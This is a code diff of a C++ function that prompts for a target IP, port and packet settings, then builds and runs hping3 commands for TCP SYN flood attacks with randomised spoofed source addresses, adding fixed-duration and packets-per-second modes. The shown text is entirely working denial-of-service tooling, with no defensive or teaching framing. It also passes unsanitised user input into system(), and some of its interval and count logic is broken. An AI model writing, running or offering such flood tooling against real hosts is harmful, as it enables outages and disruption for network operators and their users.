@@ -181,42 +181,81 @@ void tcpSynFloodAttack(void)
     
    tcpfloodattacktypes tcpAttackType = selectTcpSynFloodAttack();
    print("Flood Attack Type" << tcpAttackType<<endl);
-   string packetCount="",packetSize="",port="",targetIP="";
+   string packetCount="",packetSize="",port="",targetIP="",packetPerSec="",packetDuration="";
    print("Input the size of each packet to send :: ");
    getline(cin,packetSize); 
    print("Input the ip of the target Master :: ");
    getline(cin,targetIP); 
    print("Input the port of the target Master :: ");
    getline(cin,port); 
+   string commandStr="";
 
    switch(tcpAttackType)
    {
       case FLOOD:
+      {
+         print("Input the number of packets to send :: ");
+         getline(cin,packetCount);
+         commandStr= "hping3 -c " + packetCount + 
+                      " -d " + packetSize +
+                      " -S -w 64 -p " + port +
+                      " --flood --rand-source " + targetIP;
+      }       
         break;
       case FIXEDDURATION:
+      {
+        
+        print("Input the number of seconds to send the packets :: ");
+        getline(cin,packetDuration);
+        int pD,pPS;
+        {
+          stringstream inputStream(packetDuration);
+          inputStream >> pD;
+        }
+        print("Input the  number of packets to send per second :: ");
+        getline(cin,packetPerSec);
+        {
+          stringstream inputStream(packetPerSec);
+          inputStream >> pPS;
+        }
+        int totalPkts=pD*pPS;
+        packetCount=static_cast<ostringstream *>(&(ostringstream() << (totalPkts)) )->str();
+        string packetInterval="u"+(static_cast<ostringstream *>(&(ostringstream() << (pPS*1000)) )->str());
+        commandStr= "hping3 -c " + packetCount + 
+                      " -d " + packetSize +
+                      " -S -w 64 -i "+packetInterval+ " -p " + port +
+                      " --rand-source " + targetIP;
+
+      }
         break;
       case FASTPACKETCOUNTFLOOD:
+      {
+      }
         break;
       case PACKETSPERSEC:
+      {
+        int pPS;
+        print("Input the  number of packets to send per second ::");
+        getline(cin,packetPerSec);
+        {
+          stringstream inputStream(packetPerSec);
+          inputStream >> pPS;
+        }
+        string packetInterval="u"+(static_cast<ostringstream *>(&(ostringstream() << (pPS*1000)) )->str());
+        commandStr= "hping3 -c " + packetCount + 
+                      " -d " + packetSize +
+                      " -S -w 64 -i "+packetInterval+ " -p " + port +
+                      " --rand-source " + targetIP;
+      }
         break;
       default:
         break;
    }
 
-   print("Input the number of packets to send :: ");
-   getline(cin,packetCount);
 
-   string commandStr= "hping3 -c " + packetCount + 
-                      " -d " + packetSize +
-                      " -S -w 64 -p " + port +
-                      " --flood --rand-source " + targetIP;
 
-   string commandStrWithoutFlood= "hping3 -c " + packetCount + 
-                      " -d " + packetSize +
-                      " -S -w 64 -i u10000 -p " + port +
-                      " --rand-source " + targetIP;
-  print(commandStrWithoutFlood<<endl);
-  system(commandStrWithoutFlood.c_str());
+  print(commandStr<<endl);
+  system(commandStr.c_str());
                       
 }
 tcpfloodattacktypes selectTcpSynFloodAttack(void)
